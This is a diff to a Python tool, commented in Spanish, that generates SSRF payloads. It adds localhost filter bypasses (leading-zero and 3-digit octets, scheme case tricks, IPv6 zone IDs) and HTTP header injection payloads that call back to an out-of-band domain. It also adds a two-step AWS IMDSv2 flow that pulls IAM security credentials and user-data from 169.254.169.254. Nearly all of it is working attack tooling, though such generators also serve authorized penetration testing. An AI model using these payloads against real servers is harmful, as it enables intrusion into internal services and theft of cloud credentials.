@@ -47,10 +47,23 @@ def gen_ip_bypass(target: str, uuid: str, domain: str) -> List[Dict]:
         {"payload": f"http://0x{a:02x}.0x{b:02x}.0x{c:02x}.0x{d:02x}/", "desc": "Hex con puntos", "technique": "ip-hex-dotted"},
     ]
 
+    # Leading-zeros bypass
+    entries += [
+        {"payload": f"http://0{a}.0{b}.0{c}.0{d}/", "desc": f"Leading zeros ({target})", "technique": "ip-leading-zeros"},
+        {"payload": f"http://{a:03d}.{b:03d}.{c:03d}.{d:03d}/", "desc": f"Octetos 3 dígitos ({target})", "technique": "ip-leading-zeros-3"},
+    ]
+
+    # Scheme case bypass
+    entries += [
+        {"payload": f"HTTP://{target}/", "desc": "Scheme uppercase", "technique": "scheme-uppercase"},
+        {"payload": f"hTTp://{target}/", "desc": "Scheme mixed-case", "technique": "scheme-mixedcase"},
+    ]
+
     if target == "127.0.0.1":
         entries += [
             {"payload": "http://[::1]/", "desc": "IPv6 loopback compacto", "technique": "ip-ipv6"},
             {"payload": "http://[::ffff:127.0.0.1]/", "desc": "IPv4-mapped IPv6", "technique": "ip-ipv4mapped"},
+            {"payload": "http://[fe80::1%25eth0]/", "desc": "IPv6 Zone ID bypass", "technique": "ip-ipv6-zone"},
             {"payload": "http://127.1/", "desc": "IP corta", "technique": "ip-short"},
             {"payload": "http://0/", "desc": "IP cero (0.0.0.0)", "technique": "ip-zero"},
             {"payload": "http://localhost/", "desc": "localhost keyword", "technique": "ip-localhost"},
@@ -109,6 +122,46 @@ def gen_protocols(uuid: str, domain: str) -> List[Dict]:
     ]
 
 
+def gen_headers(uuid: str, domain: str) -> List[Dict]:
+    """Payloads para inyectar en headers HTTP que el backend procesa como URLs."""
+    target = f"http://{uuid}.{domain}/header-ssrf"
+    return [
+        {"payload": target, "desc": "Inyectar en X-Forwarded-For", "technique": "header-xff"},
+        {"payload": target, "desc": "Inyectar en X-Original-URL (nginx/traefik)", "technique": "header-original-url"},
+        {"payload": target, "desc": "Inyectar en X-Rewrite-URL (IIS)", "technique": "header-rewrite-url"},
+        {"payload": target, "desc": "Inyectar en Referer (social preview bots)", "technique": "header-referer"},
+        {"payload": f"{uuid}.{domain}", "desc": "Inyectar en Host header", "technique": "header-host"},
+        {"payload": target, "desc": "Inyectar en X-Forwarded-Host (CDNs)", "technique": "header-fwd-host"},
+    ]
+
+
+def gen_imdsv2(uuid: str, domain: str) -> List[Dict]:
+    """Flujo de dos pasos AWS IMDSv2 con instrucciones explícitas."""
+    oob = f"http://{uuid}.{domain}/imdsv2-confirm"
+    return [
+        {
+            "payload": "http://169.254.169.254/latest/api/token",
+            "desc": "IMDSv2 paso 1 — PUT con header 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
+            "technique": "cloud-aws-imdsv2-step1",
+        },
+        {
+            "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "desc": "IMDSv2 paso 2 — GET con header 'X-aws-ec2-metadata-token: <TOKEN_DEL_PASO_1>'",
+            "technique": "cloud-aws-imdsv2-step2",
+        },
+        {
+            "payload": "http://169.254.169.254/latest/user-data",
+            "desc": "IMDSv2 user-data (puede contener credenciales hardcoded)",
+            "technique": "cloud-aws-imdsv2-userdata",
+        },
+        {
+            "payload": oob,
+            "desc": "OOB para confirmar acceso a IMDS desde el servidor objetivo",
+            "technique": "cloud-aws-imdsv2-oob",
+        },
+    ]
+
+
 def gen_exfil(uuid: str, domain: str) -> List[Dict]:
     # Ejemplos de cómo codificar datos en subdominios DNS
     sample_b64 = base64.b64encode(b"whoami").decode().rstrip("=")
@@ -129,6 +182,8 @@ GENERATORS = {
     "cloud":    gen_cloud,
     "protocol": gen_protocols,
     "exfil":    gen_exfil,
+    "headers":  gen_headers,
+    "imdsv2":   gen_imdsv2,
 }
 
 
@@ -151,7 +206,7 @@ def main():
         formatter_class=argparse.RawTextHelpFormatter,
     )
     parser.add_argument("--type", default="all",
-        choices=["all", "oob", "ssrf", "bypass", "rebind", "cloud", "protocol", "exfil"],
+        choices=["all", "oob", "ssrf", "bypass", "rebind", "cloud", "protocol", "exfil", "headers", "imdsv2"],
         help="Tipo de payload a generar")
     parser.add_argument("--domain", default="oob.example.com", help="Dominio OOB (ej: oob.tudominio.com)")
     parser.add_argument("--target", default="127.0.0.1", help="IP objetivo para bypass (default: 127.0.0.1)")
